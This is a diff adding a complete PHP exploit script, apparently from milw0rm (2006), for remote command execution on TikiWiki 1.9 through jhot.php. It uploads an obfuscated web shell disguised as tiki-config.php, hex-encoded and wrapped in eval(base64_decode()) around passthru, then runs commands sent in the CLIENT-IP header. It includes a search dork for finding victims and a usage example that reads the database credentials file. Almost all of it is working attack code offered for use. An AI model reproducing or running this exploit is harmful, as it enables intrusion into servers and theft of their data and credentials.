@@ -1,0 +1,186 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+print_r('
+--------------------------------------------------------------------------------
+TikiWiki <= 1.9 Sirius "jhot.php" remote commands execution exploit
+by rgod rgod@autistici.org
+site: http://retrogod.altervista.org
+dork: "powered by tikiwiki"
+--------------------------------------------------------------------------------
+');
+/*
+works regardless of php.ini settings
+*/
+if ($argc<4) {
+print_r('
+--------------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path cmd OPTIONS
+host:      target server (ip/hostname)
+path:      path to tikiwiki
+cmd:       a shell command
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' localhost /tikiwiki/ ls -la -P1.1.1.1:80
+php '.$argv[0].' localhost /tikiwiki/ cat ./../../db/local.php -p81
+--------------------------------------------------------------------------------
+');
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+   $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+   }
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";
+$port=80;
+$proxy="";
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$scode=
+"\x0d\x0a\x3c\x3f\x70\x68\x70\x0d\x0a\x2f\x2f\x20\x24\x48\x65\x61".
+"\x64\x65\x72\x3a\x20\x2f\x63\x76\x73\x72\x6f\x6f\x74\x2f\x74\x69".
+"\x6b\x69\x77\x69\x6b\x69\x2f\x74\x69\x6b\x69\x2f\x74\x69\x6b\x69".
+"\x2d\x63\x6f\x6e\x66\x69\x67\x2e\x70\x68\x70\x2c\x76\x20\x31\x2e".
+"\x38\x2e\x32\x2e\x35\x20\x32\x30\x30\x35\x2f\x30\x38\x2f\x32\x32".
+"\x20\x30\x38\x3a\x30\x30\x3a\x35\x33\x20\x74\x65\x6c\x65\x6e\x69".
+"\x65\x6b\x6f\x20\x45\x78\x70\x20\x24\x0d\x0a\x0d\x0a\x2f\x2f\x20".
+"\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x20\x28\x63\x29\x20\x32\x30".
+"\x30\x32\x2d\x32\x30\x30\x35\x2c\x20\x4c\x75\x69\x73\x20\x41\x72".
+"\x67\x65\x72\x69\x63\x68\x2c\x20\x47\x61\x72\x6c\x61\x6e\x64\x20".
+"\x46\x6f\x73\x74\x65\x72\x2c\x20\x45\x64\x75\x61\x72\x64\x6f\x20".
+"\x50\x6f\x6c\x69\x64\x6f\x72\x2c\x20\x65\x74\x2e\x20\x61\x6c\x2e".
+"\x0d\x0a\x2f\x2f\x20\x41\x6c\x6c\x20\x52\x69\x67\x68\x74\x73\x20".
+"\x52\x65\x73\x65\x72\x76\x65\x64\x2e\x20\x53\x65\x65\x20\x63\x6f".
+"\x70\x79\x72\x69\x67\x68\x74\x2e\x74\x78\x74\x20\x66\x6f\x72\x20".
+"\x64\x65\x74\x61\x69\x6c\x73\x20\x61\x6e\x64\x20\x61\x20\x63\x6f".
+"\x6d\x70\x6c\x65\x74\x65\x20\x6c\x69\x73\x74\x20\x6f\x66\x20\x61".
+"\x75\x74\x68\x6f\x72\x73\x2e\x0d\x0a\x2f\x2f\x20\x4c\x69\x63\x65".
+"\x6e\x73\x65\x64\x20\x75\x6e\x64\x65\x72\x20\x74\x68\x65\x20\x47".
+"\x4e\x55\x20\x4c\x45\x53\x53\x45\x52\x20\x47\x45\x4e\x45\x52\x41".
+"\x4c\x20\x50\x55\x42\x4c\x49\x43\x20\x4c\x49\x43\x45\x4e\x53\x45".
+"\x2e\x20\x53\x65\x65\x20\x6c\x69\x63\x65\x6e\x73\x65\x2e\x74\x78".
+"\x74\x20\x66\x6f\x72\x20\x64\x65\x74\x61\x69\x6c\x73\x2e\x0d\x0a".
+"\x0d\x0a\x23\x20\x24\x48\x65\x61\x64\x65\x72\x3a\x20\x2f\x63\x76".
+"\x73\x72\x6f\x6f\x74\x2f\x74\x69\x6b\x69\x77\x69\x6b\x69\x2f\x74".
+"\x69\x6b\x69\x2f\x62\x61\x6e\x6e\x65\x72\x5f\x69\x6d\x61\x67\x65".
+"\x2e\x70\x68\x70\x2c\x76\x20\x31\x2e\x38\x2e\x32\x2e\x35\x20\x32".
+"\x30\x30\x35\x2f\x30\x38\x2f\x32\x32\x20\x30\x38\x3a\x30\x30\x3a".
+"\x35\x33\x20\x74\x65\x6c\x65\x6e\x69\x65\x6b\x6f\x20\x45\x78\x70".
+"\x20\x24\x0d\x0a\x0d\x0a\x2f\x2f\x20\x74\x69\x6b\x69\x77\x69\x6b".
+"\x69\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69\x6f\x6e\x20".
+"\x73\x63\x72\x69\x70\x74\x0d\x0a\x0d\x0a\x65\x76\x61\x6c\x28\x62".
+"\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x22\x5a\x58".
+"\x4a\x79\x62\x33\x4a\x66\x63\x6d\x56\x77\x62\x33\x4a\x30\x61\x57".
+"\x35\x6e\x4b\x44\x41\x70\x4f\x33\x4e\x6c\x64\x46\x39\x30\x61\x57".
+"\x31\x6c\x58\x32\x78\x70\x62\x57\x6c\x30\x4b\x44\x41\x70\x4f\x32".
+"\x56\x6a\x61\x47\x38\x67\x49\x6d\x31\x35\x58\x32\x52\x6c\x62\x47".
+"\x6c\x74\x49\x6a\x74\x77\x59\x58\x4e\x7a\x64\x47\x68\x79\x64\x53".
+"\x67\x6b\x58\x31\x4e\x46\x55\x6c\x5a\x46\x55\x6c\x73\x69\x53\x46".
+"\x52\x55\x55\x46\x39\x44\x54\x45\x6c\x46\x54\x6c\x52\x66\x53\x56".
+"\x41\x69\x58\x53\x6b\x37\x22\x29\x29\x3b\x0d\x0a\x3f\x3e\x0d\x0a";
+
+$data.="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"filepath\"; filename=\"tiki-config.php\";\r\n\r\n";
+$data.="$scode\r\n";
+$data.="-----------------------------7d529a1d23092a--\r\n";
+$packet ="POST ".$p."jhot.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Accept: text/plain\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if ((!strstr($html,"200 OK")) | (eregi("supplied argument is not a valid stream resource",$html))) {die($html);}
+sleep(2);
+$packet ="GET ".$p."img/wiki/tiki-config.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="CLIENT-IP: ".$cmd.";\r\n";
+$packet.="Accept: text/plain\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (strstr($html,"my_delim"))
+{
+echo "exploit succeeded ...\r\n";
+$temp=explode("my_delim",$html);
+die($temp[1]);
+}
+//if you are here...
+echo "exploit failed ...\r\n";
+?>
+
+# milw0rm.com [2006-09-02]
